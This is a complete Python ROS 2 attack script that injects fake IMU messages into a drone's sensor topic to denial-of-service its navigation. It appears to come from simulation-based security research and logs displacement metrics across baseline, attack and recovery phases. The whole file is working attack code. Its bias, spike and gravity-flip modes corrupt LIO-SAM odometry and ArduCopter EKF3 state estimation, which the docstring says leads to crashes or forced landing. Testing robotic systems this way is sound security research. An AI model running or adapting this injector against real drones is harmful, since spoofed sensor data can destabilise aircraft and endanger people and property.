#!/usr/bin/env python3
"""
Layer 2 Attack: IMU Data Injection — Navigation Pipeline Denial of Service

Publishes fake IMU messages to the target drone's IMU topic. Both LIO-SAM
and ArduCopter's EKF3 consume IMU data for state estimation. Injecting
false accelerometer/gyroscope readings corrupts:

  1. LIO-SAM preintegration → odometry diverges → "Large velocity" resets
     → eventual gtsam::IndeterminantLinearSystemException crash
  2. EKF3 state prediction → variance spike past FS_EKF_THRESH → Land Mode

The attack publishes at a rate matching or exceeding the real IMU (~1000 Hz
from Gazebo). The injected data contains biased accelerometer readings that
make the system think the drone is accelerating when it isn't.

Attacker model: network participant that can PUBLISH to any DDS topic
(SROS2 disabled). The attacker publishes additional IMU messages alongside
the real ones — no interception or modification required.

Attack modes:
  - bias: Add a constant acceleration bias (subtle, causes gradual drift)
  - spike: Inject large acceleration spikes (aggressive, fast crash)
  - flip: Invert gravity direction (makes system think drone is upside down)

Usage:
  ros2 run swarm_mission imu_injector --ros-args \
    -p target_drone:=drone1 \
    -p mode:=spike \
    -p injection_rate:=500.0 \
    -p attack_duration:=30.0

Output:
  - CSV: ~/imu_injection_metrics_<drone>_<timestamp>.csv
"""
import csv
import math
import os
import time
from datetime import datetime

import rclpy
from rclpy.node import Node
from rclpy.qos import QoSProfile, ReliabilityPolicy, HistoryPolicy, DurabilityPolicy
from sensor_msgs.msg import Imu
from geometry_msgs.msg import PoseStamped


class ImuInjector(Node):
    def __init__(self):
        super().__init__('imu_injector')

        # ---- Parameters ----
        self.declare_parameter('target_drone', 'drone1')
        self.declare_parameter('mode', 'spike')           # bias | spike | flip
        self.declare_parameter('injection_rate', 500.0)    # Hz
        self.declare_parameter('baseline_duration', 10.0)
        self.declare_parameter('attack_duration', 30.0)
        self.declare_parameter('recovery_duration', 20.0)

        # Bias mode params
        self.declare_parameter('accel_bias_x', 5.0)       # m/s^2
        self.declare_parameter('accel_bias_y', 0.0)
        self.declare_parameter('accel_bias_z', 0.0)

        # Spike mode params
        self.declare_parameter('spike_magnitude', 30.0)    # m/s^2 (>9.8 = exceeds gravity)
        self.declare_parameter('spike_axis', 'z')          # x | y | z

        self.declare_parameter('output_dir', os.path.expanduser('~'))

        self.target_drone = self.get_parameter('target_drone').value
        self.mode = self.get_parameter('mode').value
        self.injection_rate = self.get_parameter('injection_rate').value
        self.baseline_dur = self.get_parameter('baseline_duration').value
        self.attack_dur = self.get_parameter('attack_duration').value
        self.recovery_dur = self.get_parameter('recovery_duration').value
        self.accel_bias_x = self.get_parameter('accel_bias_x').value
        self.accel_bias_y = self.get_parameter('accel_bias_y').value
        self.accel_bias_z = self.get_parameter('accel_bias_z').value
        self.spike_magnitude = self.get_parameter('spike_magnitude').value
        self.spike_axis = self.get_parameter('spike_axis').value
        self.output_dir = self.get_parameter('output_dir').value

        # ---- Topics ----
        self.imu_topic = f'/{self.target_drone}/imu/data'

        if self.target_drone == 'drone1':
            self.local_pos_topic = '/mavros/local_position/pose'
        else:
            self.local_pos_topic = f'/{self.target_drone}/mavros/local_position/pose'

        # ---- State ----
        self.phase = 'baseline'
        self.phase_start_time = None
        self.latest_real_imu = None      # most recent real IMU message
        self.drone_pose = None
        self.attack_origin = None
        self.inject_timer = None
        self.inject_count = 0

        # Metrics
        self.metrics = []
        self.metric_interval = 1.0
        self.last_metric_time = 0.0

        # ---- QoS ----
        qos_besteffort = QoSProfile(
            reliability=ReliabilityPolicy.BEST_EFFORT,
            history=HistoryPolicy.KEEP_LAST,
            durability=DurabilityPolicy.VOLATILE,
            depth=5)

        # Subscribe to real IMU to get timestamps and base values
        self.imu_sub = self.create_subscription(
            Imu, self.imu_topic,
            self.imu_callback, qos_besteffort)

        # Monitor drone position
        self.pose_sub = self.create_subscription(
            PoseStamped, self.local_pos_topic,
            self.pose_callback, qos_besteffort)

        # Publisher — the attack vector
        # Use BEST_EFFORT to match real IMU QoS
        self.imu_pub = self.create_publisher(
            Imu, self.imu_topic, qos_besteffort)

        # Phase timer
        self.phase_timer = self.create_timer(0.5, self.phase_tick)

        # CSV
        timestamp_str = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.csv_path = os.path.join(
            self.output_dir,
            f'imu_injection_metrics_{self.target_drone}_{timestamp_str}.csv')

        mode_desc = {
            'bias': f'BIAS (accel +{self.accel_bias_x},{self.accel_bias_y},{self.accel_bias_z} m/s^2)',
            'spike': f'SPIKE ({self.spike_magnitude} m/s^2 on {self.spike_axis}-axis)',
            'flip': 'FLIP (invert gravity)',
        }.get(self.mode, self.mode)

        self.get_logger().info(
            f'=== IMU Data Injection Attack ===\n'
            f'  Target: {self.target_drone}\n'
            f'  IMU topic: {self.imu_topic}\n'
            f'  Mode: {mode_desc}\n'
            f'  Injection rate: {self.injection_rate} Hz\n'
            f'  Phases: baseline={self.baseline_dur}s, '
            f'attack={self.attack_dur}s, recovery={self.recovery_dur}s\n'
            f'  CSV: {self.csv_path}\n'
            f'  Starting BASELINE phase...')

        self.phase_start_time = time.monotonic()

    # ---- Callbacks ----

    def imu_callback(self, msg: Imu):
        self.latest_real_imu = msg

    def pose_callback(self, msg: PoseStamped):
        self.drone_pose = msg.pose

    # ---- Injection ----

    def publish_injection(self):
        """Publish a fake IMU message based on attack mode."""
        if self.latest_real_imu is None:
            return

        msg = Imu()
        msg.header.stamp = self.latest_real_imu.header.stamp  # sim time
        msg.header.frame_id = self.latest_real_imu.header.frame_id

        # Start from real orientation
        msg.orientation = self.latest_real_imu.orientation

        # Real angular velocity (keep it realistic for gyro)
        msg.angular_velocity = self.latest_real_imu.angular_velocity

        if self.mode == 'bias':
            # Add constant bias to accelerometer
            msg.linear_acceleration.x = (
                self.latest_real_imu.linear_acceleration.x + self.accel_bias_x)
            msg.linear_acceleration.y = (
                self.latest_real_imu.linear_acceleration.y + self.accel_bias_y)
            msg.linear_acceleration.z = (
                self.latest_real_imu.linear_acceleration.z + self.accel_bias_z)

        elif self.mode == 'spike':
            # Large acceleration spike on chosen axis
            msg.linear_acceleration.x = self.latest_real_imu.linear_acceleration.x
            msg.linear_acceleration.y = self.latest_real_imu.linear_acceleration.y
            msg.linear_acceleration.z = self.latest_real_imu.linear_acceleration.z

            if self.spike_axis == 'x':
                msg.linear_acceleration.x += self.spike_magnitude
            elif self.spike_axis == 'y':
                msg.linear_acceleration.y += self.spike_magnitude
            else:  # z
                msg.linear_acceleration.z += self.spike_magnitude

        elif self.mode == 'flip':
            # Invert gravity — makes system think drone is upside down
            msg.linear_acceleration.x = -self.latest_real_imu.linear_acceleration.x
            msg.linear_acceleration.y = -self.latest_real_imu.linear_acceleration.y
            msg.linear_acceleration.z = -self.latest_real_imu.linear_acceleration.z

        # Copy covariance from real message
        msg.orientation_covariance = self.latest_real_imu.orientation_covariance
        msg.angular_velocity_covariance = self.latest_real_imu.angular_velocity_covariance
        msg.linear_acceleration_covariance = self.latest_real_imu.linear_acceleration_covariance

        self.imu_pub.publish(msg)
        self.inject_count += 1

    # ---- Phase management ----

    def phase_tick(self):
        now = time.monotonic()
        elapsed = now - self.phase_start_time

        # Position displacement
        displacement = None
        if self.attack_origin is not None and self.drone_pose is not None:
            dx = self.drone_pose.position.x - self.attack_origin.position.x
            dy = self.drone_pose.position.y - self.attack_origin.position.y
            dz = self.drone_pose.position.z - self.attack_origin.position.z
            displacement = math.sqrt(dx**2 + dy**2 + dz**2)

        # Log metrics
        if now - self.last_metric_time >= self.metric_interval:
            self.last_metric_time = now

            metric = {
                'timestamp': datetime.now().isoformat(),
                'phase': self.phase,
                'phase_elapsed_s': round(elapsed, 2),
                'inject_count': self.inject_count,
                'displacement_m': round(displacement, 3) if displacement is not None else None,
            }

            if self.drone_pose is not None:
                metric['drone_x'] = round(self.drone_pose.position.x, 3)
                metric['drone_y'] = round(self.drone_pose.position.y, 3)
                metric['drone_z'] = round(self.drone_pose.position.z, 3)

            self.metrics.append(metric)

            phase_char = {
                'baseline': '[B]',
                'attack': '[A]',
                'recovery': '[R]',
            }.get(self.phase, '[?]')

            pos_str = ''
            if self.drone_pose is not None:
                pos_str = (f'pos: ({self.drone_pose.position.x:.1f}, '
                           f'{self.drone_pose.position.y:.1f}, '
                           f'{self.drone_pose.position.z:.1f})')

            disp_str = f'disp: {displacement:.2f}m' if displacement is not None else ''

            self.get_logger().info(
                f'{phase_char} {elapsed:.0f}s | {pos_str} | '
                f'{disp_str} | injected: {self.inject_count}')

        # Phase transitions
        if self.phase == 'baseline' and elapsed >= self.baseline_dur:
            self._start_attack()
        elif self.phase == 'attack' and elapsed >= self.attack_dur:
            self._start_recovery()
        elif self.phase == 'recovery' and elapsed >= self.recovery_dur:
            self._finish()

    def _start_attack(self):
        self.phase = 'attack'
        self.phase_start_time = time.monotonic()

        if self.drone_pose is not None:
            from geometry_msgs.msg import Pose
            self.attack_origin = Pose()
            self.attack_origin.position.x = self.drone_pose.position.x
            self.attack_origin.position.y = self.drone_pose.position.y
            self.attack_origin.position.z = self.drone_pose.position.z

        # Start injecting
        period = 1.0 / self.injection_rate
        self.inject_timer = self.create_timer(period, self.publish_injection)

        self.get_logger().warn(
            f'=== ATTACK PHASE — Injecting fake IMU at {self.injection_rate} Hz ===\n'
            f'  Mode: {self.mode}')

    def _start_recovery(self):
        self.phase = 'recovery'
        self.phase_start_time = time.monotonic()

        if self.inject_timer is not None:
            self.inject_timer.cancel()
            self.destroy_timer(self.inject_timer)
            self.inject_timer = None

        self.get_logger().warn(
            f'=== RECOVERY PHASE — Injection stopped ===')

    def _finish(self):
        self.phase = 'done'
        self.phase_timer.cancel()

        self._write_csv()

        attack_displacements = [m['displacement_m'] for m in self.metrics
                                if m['phase'] == 'attack'
                                and m['displacement_m'] is not None]

        max_disp = max(attack_displacements) if attack_displacements else 0
        final_disp = attack_displacements[-1] if attack_displacements else 0

        min_z = None
        for m in self.metrics:
            if m['phase'] in ('attack', 'recovery') and 'drone_z' in m:
                if min_z is None or m['drone_z'] < min_z:
                    min_z = m['drone_z']

        min_z_str = f'{min_z:>6.2f}m' if min_z is not None else '  N/A '

        self.get_logger().warn(
            f'\n'
            f'╔═══════════════════════════════════════════╗\n'
            f'║       IMU INJECTION ATTACK RESULTS        ║\n'
            f'╠═══════════════════════════════════════════╣\n'
            f'║ Target: {self.target_drone:<34}║\n'
            f'║ Mode: {self.mode:<36}║\n'
            f'║ Injection rate:       {self.injection_rate:>6.0f} Hz           ║\n'
            f'║ Total injected msgs:  {self.inject_count:>6d}              ║\n'
            f'║ Max displacement:     {max_disp:>6.2f}m             ║\n'
            f'║ Final attack disp:    {final_disp:>6.2f}m             ║\n'
            f'║ Min altitude:         {min_z_str}             ║\n'
            f'╚═══════════════════════════════════════════╝\n'
            f'\n'
            f'CSV saved: {self.csv_path}')

    def _write_csv(self):
        if not self.metrics:
            return
        fieldnames = ['timestamp', 'phase', 'phase_elapsed_s', 'inject_count',
                      'displacement_m', 'drone_x', 'drone_y', 'drone_z']
        try:
            with open(self.csv_path, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=fieldnames,
                                        extrasaction='ignore')
                writer.writeheader()
                writer.writerows(self.metrics)
            self.get_logger().info(f'Wrote {len(self.metrics)} rows to {self.csv_path}')
        except Exception as e:
            self.get_logger().error(f'Failed to write CSV: {e}')


def main(args=None):
    rclpy.init(args=args)
    node = ImuInjector()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        if node.phase != 'done':
            node.get_logger().warn('Interrupted — writing partial metrics...')
            node._write_csv()
        node.get_logger().info(
            f'Shutting down — {node.inject_count} IMU messages injected')
    finally:
        if node.inject_timer is not None:
            node.inject_timer.cancel()
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
